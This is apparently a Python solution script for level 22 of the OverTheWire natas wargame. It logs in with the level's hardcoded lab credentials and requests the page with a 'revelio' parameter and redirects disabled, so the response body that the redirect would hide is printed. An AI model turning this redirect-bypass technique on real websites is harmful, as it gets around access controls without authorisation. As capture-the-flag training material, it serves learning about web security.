import requests
import re
from string import *
import time
import sys
import codecs

characters = "abcdefghijkjmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ0123456789"

for a in range(1):
    logar = ["natas22","chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"]
    url = "http://%s.natas.labs.overthewire.org/?revelio=1"%logar[0]
    session = requests.Session()

    r = session.get(url ,cookies={},data={}, auth=(logar[0],logar[1]),allow_redirects=0, timeout=10)
    contento = r.text
    print(contento)
    print(session.cookies)


    print("="*80)
